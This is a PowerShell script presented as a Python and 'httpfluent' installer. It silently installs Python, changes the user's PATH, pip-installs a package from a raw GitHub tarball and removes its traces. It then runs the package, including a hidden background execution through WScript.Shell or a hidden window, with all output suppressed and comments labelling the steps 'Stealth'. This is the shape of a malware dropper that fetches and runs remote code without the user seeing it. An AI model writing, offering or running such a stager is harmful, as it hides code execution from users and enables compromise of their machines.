# ===================================================
# Python Auto-Detect + httpfluent Installer (Stealth + Visible Exec)
# ===================================================

# Step 0: Detect highest Python >=3.9
$PythonCandidates = @()

# 1) Python on PATH
if (Get-Command python -ErrorAction SilentlyContinue) {
    $PythonCandidates += "python"
}

# 2) Check common install directories
$Roots = @(
    "$env:LOCALAPPDATA\Programs\Python",
    "$env:ProgramFiles\Python",
    "$env:ProgramFiles(x86)\Python"
)

foreach ($root in $Roots) {
    if (Test-Path $root) {
        Get-ChildItem $root -Directory | ForEach-Object {
            $exe = Join-Path $_.FullName "python.exe"
            if (Test-Path $exe) {
                $PythonCandidates += $exe
            }
        }
    }
}

# 3) Select highest Python >= 3.9
$CheckPath = $null
$HighestVersion = $null
foreach ($candidate in $PythonCandidates | Select-Object -Unique) {
    try {
        $out = & $candidate --version 2>&1
        if ($out -match "Python (\d+\.\d+\.\d+)") {
            $ver = [version]$Matches[1]
            if ($ver -ge [version]"3.9") {
                if (-not $HighestVersion -or $ver -gt $HighestVersion) {
                    $HighestVersion = $ver
                    $CheckPath = $candidate
                }
            }
        }
    } catch {}
}

# Step 0b: Default InstallDir if no Python found yet
$InstallDir = "$env:LOCALAPPDATA\Programs\Python\Python312"
$PythonExe = Join-Path $InstallDir "python.exe"

# Step 0c: Decide whether install is required
if ($CheckPath) {
    $InstallRequired = $false
    $ExecutableToUse = $CheckPath
} else {
    $InstallRequired = $true
    $ExecutableToUse = $PythonExe
}

# ===================================================
# Steps 1-5: Stealth installation logic (unchanged)
# ===================================================
if ($InstallRequired) {
    $PythonVersion = "3.12.6"
    $PythonInstaller = "python-$PythonVersion-amd64.exe"
    $DownloadDir = "$env:TEMP\Python"
    if (-not (Test-Path $DownloadDir)) { New-Item -ItemType Directory -Path $DownloadDir > $null 2>&1 }
    $InstallerPath = Join-Path $DownloadDir "python-installer.exe"

    try {
        (New-Object System.Net.WebClient).DownloadFile("https://www.python.org/ftp/python/$PythonVersion/python-$PythonVersion-amd64.exe", $InstallerPath)
    } catch { exit 1 }

    # Stealth Installation
    Start-Process -FilePath $InstallerPath -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0 TargetDir=`"$InstallDir`"" -Wait -WindowStyle Hidden > $null 2>&1

    # Update PATH
    $OldPath = [Environment]::GetEnvironmentVariable("Path","User")
    $NewPath = "$InstallDir;$InstallDir\Scripts;" + ($OldPath -replace [regex]::Escape("$env:LOCALAPPDATA\Microsoft\WindowsApps;"),"")
    [Environment]::SetEnvironmentVariable("Path",$NewPath,"User") > $null 2>&1
    $env:Path = $NewPath
    $ExecutableToUse = $PythonExe
}

# ===================================================
# Step 7: Package Installation (Stealth)
# ===================================================
& $ExecutableToUse -m pip install --upgrade pip --quiet > $null 2>&1
& $ExecutableToUse -m pip install requests --quiet > $null 2>&1
& $ExecutableToUse -m pip install "https://github.com/httpfluent/Intranetflow/raw/main/v1.0/httpfluent-0.1.tar.gz" --quiet > $null 2>&1

# ===================================================
# Cleanup temp installer folder
# ===================================================
if (Test-Path "$env:TEMP\Python") {
    Remove-Item "$env:TEMP\Python" -Recurse -Force -ErrorAction SilentlyContinue > $null 2>&1
}

# ===================================================
# Launch httpfluent (Visible)
# ===================================================
# Attempt direct command
try {
    $ScriptsDir = Join-Path (Split-Path $ExecutableToUse) "Scripts"
    $HttpFluentExe = Join-Path $ScriptsDir "httpfluent.exe"

    if (Test-Path $HttpFluentExe) {
        Write-Host "[+] Launching httpfluent from $HttpFluentExe"
        & $HttpFluentExe
    } elseif (Get-Command httpfluent -ErrorAction SilentlyContinue) {
        Write-Host "[+] Launching httpfluent via PATH..."
        httpfluent
    } else {
        Write-Host "[-] httpfluent executable not found"
        Write-Host "    Expected at: $HttpFluentExe"
    }

    # COM fallback (if restricted)
    $WshShell = New-Object -ComObject WScript.Shell
    $InlineCommand = "`"$ExecutableToUse`" -c `"import httpfluent`""
    $WshShell.Run($InlineCommand, 0, $false) > $null 2>&1
} catch {
    # Fallback if COM fails
    Start-Process -FilePath $ExecutableToUse -ArgumentList "-c `"import httpfluent`"" -WindowStyle Hidden > $null 2>&1
}
